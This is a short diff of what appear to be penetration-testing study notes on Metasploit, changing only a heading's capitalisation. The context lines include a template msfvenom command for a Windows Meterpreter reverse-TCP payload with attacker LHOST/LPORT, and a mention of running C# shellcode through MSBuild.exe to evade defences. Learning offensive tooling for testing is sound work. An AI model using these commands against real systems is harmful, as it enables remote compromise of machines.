@@ -172,7 +172,7 @@ Practice searching for payload and exploits inside of metasploit: `search type:e
     - `set lhost <your ip>`
     - `run` and wait for connection back
 
-### MSFVENOM
+### MSFVenom
 - Creating a payload that uses the windows/meterpreter/reverse_tcp exploit:
   - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your attacker system listeing> LPORT=<your port> -f <file output type> -o <file output name> --platform <windows/etc> -a <architecture e.g., x86>`
   - Create a C# (C-sharp) shellcode paylaod that can be run with Windows LOLBIN MSBuild.exe (After being inserted into a csharp wrapper). 
